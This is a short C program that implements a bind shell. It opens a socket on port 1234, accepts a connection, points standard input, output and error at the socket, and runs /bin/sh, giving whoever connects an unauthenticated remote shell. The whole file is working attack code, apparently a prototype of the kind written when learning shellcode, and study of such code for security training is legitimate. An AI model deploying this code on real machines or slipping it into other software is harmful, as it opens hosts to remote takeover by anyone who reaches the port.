#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

int main(void) {
    // Create a socket.
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("[!] ERR: Socket creation has failed, exiting.\n");
        return(-1);
    }
    printf("[*] Socket created successfully, now binding!\n");

    // Setting up the struct for our bind.
    struct sockaddr_in my_addr;
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(1234);
    my_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind to the socket.
    if(bind(sockfd, (struct sockaddr *)&my_addr, sizeof(my_addr)) < 0) {
        printf("[!] ERR: Socket binding has failed, exiting.\n");
        return(-1);
    }
    printf("[*] Server bound successfully!\n");

    // Listen for connections on the socket.
    if(listen(sockfd, 0) < 0) {
        printf("[!] ERR: Cannot listen on the socket, exiting.\n");
        return(-1);
    }
    printf("[*] Server is listening for connections...\n");

    // Accept connections from the socket.
    socklen_t my_addr_size;
    my_addr_size = sizeof(struct sockaddr_in);
    int acceptfd = accept(sockfd, (struct sockaddr *)&my_addr, &my_addr_size);
    if(acceptfd < 0) {
        printf("[!] ERR: Cannot accept connections on the socket, exiting.\n");
        return(-1);
    }
    printf("[*] Server is ready to accept connections!");

    // Redirect STDIN, STDOUT, STDERR for the shell.
    for (int i = 0; i < 3; i++)
        dup2(acceptfd, i);

    // execve() to give us a shell on connect.
    char *newargv[] = { NULL };
    char *newenviron[] = { NULL };

    if(execve("/bin/sh", newargv, newenviron) == -1) {
        printf("[!] ERR: Could not execute /bin/sh, exiting.\n");
        return(-1);
    }

    return 0;
}